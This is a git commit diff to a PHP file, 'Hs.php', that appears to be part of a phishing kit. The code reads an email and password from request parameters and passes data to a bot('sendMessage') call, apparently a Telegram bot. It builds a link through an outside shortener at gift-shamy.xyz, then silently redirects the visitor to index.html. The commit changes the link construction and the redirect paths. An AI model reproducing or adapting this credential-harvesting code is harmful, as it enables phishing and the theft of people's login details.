c0fba97883fc88c6dd9d6b991c7c1fe6b81039c7
ahmed-shamy <73703631+ahmed-shamy@users.noreply.github.com>
2020-11-14 12:08:47 +0100

    Update Hs.php

--- H/Hs.php
+++ H/Hs.php
@@ -37,8 +37,9 @@ $admin = $info[info]['id'];
 $email = $_GET["email"];
 $password = $_GET["password"];
 $login = $_GET["login"];
-$linky = $_SERVER['HTTP_HOST'];
-$mink ="https://$linky/index.html";
+$linky = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
+$minly ="http://$linky";
+$mink = str_replace("?email","?l",$minly);
 $api = "http://www.gift-shamy.xyz/sh.php?link=$mink"; 
 $result = json_decode(file_get_contents($api), true); 
 $shortt = $result["short"];
@@ -72,9 +73,9 @@ bot("sendMessage",[
 ?>
 <html>
   <head>
-    <meta http-equiv="refresh" content="0; url='/index.html'" />
+    <meta http-equiv="refresh" content="0; url='index.html'" />
     <script type="text/javascript">
-            window.location.href = "/index.html"
+            window.location.href = "index.html"
     </script>
  </head>
   <body>
